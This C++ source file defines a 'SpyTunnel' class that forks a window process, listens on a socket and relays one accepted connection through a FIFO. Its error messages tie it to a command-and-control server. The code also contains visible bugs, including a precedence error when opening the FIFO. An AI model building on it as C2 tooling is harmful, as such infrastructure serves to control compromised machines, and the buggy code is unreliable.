#include "spy_tunnel.hpp"

SpyTunnel::SpyTunnel(std::string* __p_ip, uint* __p_port, int __client_index, std::atomic<bool>* __p_shutdown_flag, int __connection_type, int __shutdown_event_fd, std::vector<int>*__p_tunnel_shutdown_fds)
    : p_ip_(__p_ip),
      p_port_(__p_port),
      client_index_(__client_index),
      p_shutdown_flag_(__p_shutdown_flag),
      connection_type_(__connection_type),
      shutdown_event_fd_(__shutdown_event_fd),
      p_tunnel_shutdown_fds_(__p_tunnel_shutdown_fds)
{
}

int SpyTunnel::run() {   
    pid_t pid = fork();
    if (pid < 0) {
        return -1;
    } else if (pid == 0) {
        // Child Process
        close(shutdown_event_fd_);
        close(socket_);
        spawn_window();
        std::cerr << RED << "[Server::handle_c2] Error executing C2 script: " << strerror(errno) << RESET;
        _exit(EXIT_FAILURE);
    }

    // Parent Process
    int fifo;
    int tries = 0;
    while (fifo = open(get_fifo_path(), O_WRONLY | O_NONBLOCK) < 0 && tries++<20) {
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }
    if (fifo < 0) {
        goto cleanup;
    }

    int rc;
    socket_ = socket(AF_INET, connection_type_, 0);
    if (socket_ == -1) {
        goto cleanup;    
    }
    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(*p_port_);
    if (inet_pton(AF_INET, p_ip_->c_str(), &server_addr_.sin_addr) <= 0) {
        write_error(fifo, "Invalid IP address");
        goto cleanup;
    }

    rc = bind(socket_, (const struct sockaddr*) &server_addr_, sizeof(server_addr_));
    if (rc < 0) {
        write_error(fifo, strerror(errno));
        goto cleanup;
    }
    rc = listen(socket_, 1);
    if (rc < 0) {
        write_error(fifo, strerror(errno));
        goto cleanup;
    }
    rc = accept(socket_, nullptr, nullptr);
    if (rc < 0) {
        write_error(fifo, strerror(errno));
        goto cleanup;
    }

    handle_tunnel(rc, fifo);
    close(rc);

cleanup:
    if (fifo >= 0) {
        close(fifo);
    }
    if (socket_ != -1) {
        close(socket_);
    }
    if (pid > 0) {
        kill(pid, SIGTERM);
        waitpid(pid, nullptr, 0);
    }
    return 0;
}

void SpyTunnel::write_error(int fifo, const std::string& __msg) {
    std::string full_error_msg = "[__error__]: " + __msg + "\n";
    write(fifo, full_error_msg.c_str(), full_error_msg.size());
}